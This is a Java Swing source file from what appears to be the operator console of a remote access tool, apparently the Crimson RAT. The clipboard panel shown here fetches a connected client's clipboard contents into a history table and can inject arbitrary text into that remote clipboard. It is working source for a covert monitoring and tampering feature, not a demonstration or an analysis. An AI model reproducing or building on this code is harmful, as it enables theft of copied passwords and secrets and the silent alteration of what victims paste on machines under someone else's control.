package subterranean.crimson.server.graphics.panels.cp.desktop;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.datatransfer.StringSelection;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;

import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.server.graphics.ControlPanel;
import subterranean.crimson.server.graphics.frames.MainScreen;
import subterranean.crimson.server.graphics.models.table.ClipboardTableModel;
import subterranean.crimson.server.graphics.panels.cp.CPanel;
import subterranean.crimson.universal.translation.T;

public class SPClipboard extends CPanel {

	private static final long serialVersionUID = 1L;

	private JTable clipboard_history;
	private JTextField clipboard_input_field;

	private ClipboardTableModel clipModel;

	public SPClipboard(final ControlPanel cp) {
		clipModel = new ClipboardTableModel(cp.c.getProfile().cliplog);
		setLayout(new BorderLayout(0, 0));

		JScrollPane scrollPane = new JScrollPane();
		add(scrollPane, BorderLayout.CENTER);

		clipboard_history = new JTable();
		clipboard_history.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {

				JTable source = (JTable) e.getSource();
				final int sourceRow = source.rowAtPoint(e.getPoint());

				if (sourceRow == -1) {
					return;
				}

				// pull up menu on right clicks
				if (e.getButton() == java.awt.event.MouseEvent.BUTTON3) {// right
																			// click
					// select row
					if (!source.isRowSelected(sourceRow)) {
						source.changeSelection(sourceRow, 0, false, false);
					}

					JPopupMenu popup = new JPopupMenu();
					JMenuItem copy = new JMenuItem();

					copy.setText(T.t("Copy"));
					copy.setIcon(new ImageIcon(MainScreen.class.getResource("/subterranean/crimson/server/graphics/icons/menu/C.png")));
					copy.addMouseListener(new MouseAdapter() {
						@Override
						public void mousePressed(MouseEvent e) {
							Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(clipModel.saved_strings.get(sourceRow)), null);

						}

					});

					popup.add(copy);

					popup.show(clipboard_history, e.getX(), e.getY());

				}
			}
		});
		clipboard_history.setModel(clipModel);
		scrollPane.setViewportView(clipboard_history);

		JPanel btn_panel = new JPanel();
		add(btn_panel, BorderLayout.SOUTH);

		JButton btnRefresh = new JButton(T.t("button-refresh"));
		btn_panel.add(btnRefresh);

		clipboard_input_field = new JTextField();
		btn_panel.add(clipboard_input_field);
		clipboard_input_field.setColumns(30);

		JButton btnInject = new JButton(T.t("button-inject"));
		btn_panel.add(btnInject);
		btnInject.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				new Thread(new Runnable() {
					public void run() {
						cp.consoleAppend("Placing string in client clipboard...");
						clipModel.add_string(clipboard_input_field.getText());
						ClientCommands.clipboard_inject(cp.c, clipboard_input_field.getText());
						clipboard_input_field.setText("");
					}
				}).start();

			}
		});
		btnRefresh.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				new Thread(new Runnable() {
					public void run() {
						cp.consoleAppend("Refreshing clipboard...");
						String str = ClientCommands.clipboard_retrieve(cp.c);
						if (clipModel.saved_strings.size() > 0 && str.equals(clipModel.saved_strings.get(0))) {
							return;
						}
						clipModel.add_string(str);
					}
				}).start();

			}
		});
	}

	@Override
	public void changedConnectionState(boolean connected) {
		// TODO Auto-generated method stub

	}

	@Override
	public void refresh() {
		// TODO Auto-generated method stub

	}

	@Override
	public void deinitialize() {
		// TODO Auto-generated method stub

	}

	@Override
	public String getPanelName() {
		return "clipboard";
	}

}
